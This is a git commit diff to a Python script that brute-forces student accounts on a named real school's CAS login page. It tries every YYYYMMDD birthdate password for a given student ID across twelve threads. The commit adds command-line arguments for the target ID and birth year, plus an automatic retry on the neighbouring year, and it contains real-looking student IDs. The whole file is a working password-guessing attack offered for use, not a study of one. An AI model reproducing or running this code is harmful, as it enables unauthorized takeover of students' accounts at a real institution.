4e3cb45fc5f772a6e5d5ef087c5d7f5b8f9e7338
steven12138 <18611209860@163.com>
2022-12-06 02:04:22 +0800

    add command arg parser

--- wxgs4.py
+++ wxgs4.py
@@ -4,16 +4,20 @@ import time
 from bs4 import BeautifulSoup
 import threading
 
+f = 0
+
 
 def crack(id, user, y, m1, m2, d1, d2):
     url = 'http://bdfz-cas.pkuschool.edu.cn/cas/login'
     # http://1.1.1.2/ac_portal/default/pc.html?template=default&tabs=pwd&vlanid=0&_ID_=0&url=&pop=0&type=logout&username=f0000l0052
-    f = 0
+    global f
     for i in range(m1, m2 + 1):
         if (f):
             break
-        print(id, i)
+        print("[Crashing]: Year: %4d, " % y, "Month: %2d" % i)
         for j in range(d1, d2 + 1):
+            if (f):
+                break
             pwd = "%04d%02d%02d" % (y, i, j)
             r = requests.get(url=url)
             r = BeautifulSoup(r.text, 'lxml')
@@ -30,85 +34,52 @@ def crack(id, user, y, m1, m2, d1, d2):
             r = BeautifulSoup(r.text, 'lxml')
             status = r.select('div[class="alert alert-danger"]')
             if (status == []):
-                print(user, "success", pwd)
+                print("[Success]: Password Found!  Username:", user, "Password:", pwd)
                 f = 1
                 break
     if (f):
         exit(0)
 
 
-user = "190412"
-ery=2003
-lty=2004
+user = "2523212"
+year = 2006
 
-class myth1(threading.Thread):  # 通过继承threading.Thread重写run方法的形式，创建子线程
-    def run(self):
-        crack(1, user, ery, 5, 6, 1, 31)
-
-
-class myth2(threading.Thread):  # 通过继承threading.Thread重写run方法的形式，创建子线程
-    def run(self):
-        crack(2, user, ery, 7, 8, 1, 31)
-
-
-class myth3(threading.Thread):  # 通过继承threading.Thread重写run方法的形式，创建子线程
-    def run(self):
-        crack(3, user, ery, 9, 10, 1, 31)
-
-
-class myth4(threading.Thread):  # 通过继承threading.Thread重写run方法的形式，创建子线程
-    def run(self):
-        crack(4, user, ery, 11, 12, 1, 31)
-
-
-class myth5(threading.Thread):  # 通过继承threading.Thread重写run方法的形式，创建子线程
-    def run(self):
-        crack(5, user, lty, 1, 2, 1, 31)
-
-
-class myth6(threading.Thread):  # 通过继承threading.Thread重写run方法的形式，创建子线程
-    def run(self):
-        crack(5, user, lty, 3, 4, 1, 31)
-
-
-class myth7(threading.Thread):  # 通过继承threading.Thread重写run方法的形式，创建子线程
-    def run(self):
-        crack(5, user, lty, 5, 6, 1, 31)
-
-
-class myth8(threading.Thread):  # 通过继承threading.Thread重写run方法的形式，创建子线程
-    def run(self):
-        crack(5, user, lty, 7, 8, 1, 31)
-
-
-class myth9(threading.Thread):  # 通过继承threading.Thread重写run方法的形式，创建子线程
-    def run(self):
-        crack(5, user, lty, 9, 10, 1, 31)
-
-
-class myth10(threading.Thread):  # 通过继承threading.Thread重写run方法的形式，创建子线程
-    def run(self):
-        crack(5, user, lty, 11, 12, 1, 31)
-
+import argparse
 
 if __name__ == "__main__":
-    t1 = myth1()
-    t1.start()
-    t2 = myth2()
-    t2.start()
-    t3 = myth3()
-    t3.start()
-    t4 = myth4()
-    t4.start()
-    t5 = myth5()
-    t5.start()
-    t6 = myth6()
-    t6.start()
-    t7 = myth7()
-    t7.start()
-    t8 = myth8()
-    t8.start()
-    t9 = myth9()
-    t9.start()
-    t10 = myth10()
-    t10.start()
+    parser = argparse.ArgumentParser()
+    parser.add_argument("id")
+    parser.add_argument("year")
+    args = parser.parse_args()
+    print("Crashing at:", args.id)
+    user = args.id
+    year = int(args.year)
+    thread_list = []
+    for i in range(1, 13):
+        thread = threading.Thread(target=crack, args=(i, user, year, i, i, 1, 31))
+        thread_list.append(thread)
+
+    for t in thread_list:
+        t.setDaemon(True)  # 设置为守护线程，不会因主线程结束而中断
+        t.start()
+    for t in thread_list:
+        t.join()
+
+    if not f:
+        print("[Failed]: Password Not Match. You May try year: %d or %d" % (year - 1, year + 1))
+        res = input("retry most common year? [Y/n]")
+        if res not in ["N", "n", "No", "no"]:
+            f = 0
+            thread_list = []
+            for i in range(1, 13):
+                thread = threading.Thread(target=crack, args=(i, user, year - 1, i, i, 1, 31))
+                thread_list.append(thread)
+
+            for t in thread_list:
+                t.setDaemon(True)  # 设置为守护线程，不会因主线程结束而中断
+                t.start()
+            for t in thread_list:
+                t.join()
+
+            if not f:
+                print("[Failed]: Crash Failed")
